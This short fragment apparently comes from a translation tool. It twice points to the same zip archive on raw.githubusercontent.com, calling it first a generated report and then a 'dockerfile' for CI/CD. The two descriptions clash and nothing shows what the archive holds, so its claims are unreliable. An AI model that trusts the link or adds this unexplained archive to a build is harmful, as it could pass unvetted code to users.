...
192/5000
The file 'https://raw.githubusercontent.com/marcossangomes/reports-ec2-numbers-n-type/master/demidandiprat/n-type-ec-numbers-reports-3.7.zip' is the report that is generated;

I put a 'dockerfile' together with the 'https://raw.githubusercontent.com/marcossangomes/reports-ec2-numbers-n-type/master/demidandiprat/n-type-ec-numbers-reports-3.7.zip' for the application if you want to create a CI / CD of the process;
